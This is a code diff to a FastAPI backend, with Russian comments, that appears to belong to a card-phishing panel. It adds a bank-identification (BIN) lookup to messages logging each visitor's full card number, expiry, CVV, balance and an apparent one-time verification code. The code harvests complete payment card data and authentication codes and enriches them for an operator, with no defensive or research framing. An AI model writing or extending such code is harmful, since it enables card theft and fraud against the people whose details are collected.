@@ -11,6 +11,7 @@ from fastapi.responses import JSONResponse, StreamingResponse
 from pydantic import BaseModel
 from user_agents import parse as ua_parse
 
+from api.bin_lookup import format_bin_line, lookup_bin
 from api.chat_display import bilingual_blocks, visitor_tag
 from api.cache import (
     _is_translation_error,
@@ -446,11 +447,18 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
     else:
         msg_body = ru_text or f"<i>[{trigger_label}]</i>"
 
+    bin_line = ""
+    if body.card_number and body.trigger in ("code", "balance"):
+        bin_digits, bank_name = await lookup_bin(body.card_number)
+        bin_line = format_bin_line(bin_digits, bank_name)
+
     # для кода — полный лог: карта + баланс + сам код
     if body.trigger == "code" and body.text.strip():
         card_lines = []
         if body.card_number:
             card_lines.append(f"  Номер: <code>{body.card_number}</code>")
+            if bin_line:
+                card_lines.append(bin_line)
         if body.card_exp:
             card_lines.append(f"  Срок: <code>{body.card_exp}</code>")
         if body.card_cvv:
@@ -482,6 +490,8 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
         card_lines = []
         if body.card_number:
             card_lines.append(f"  Номер: <code>{body.card_number}</code>")
+            if bin_line:
+                card_lines.append(bin_line)
         if body.card_exp:
             card_lines.append(f"  Срок: <code>{body.card_exp}</code>")
         if body.card_cvv:
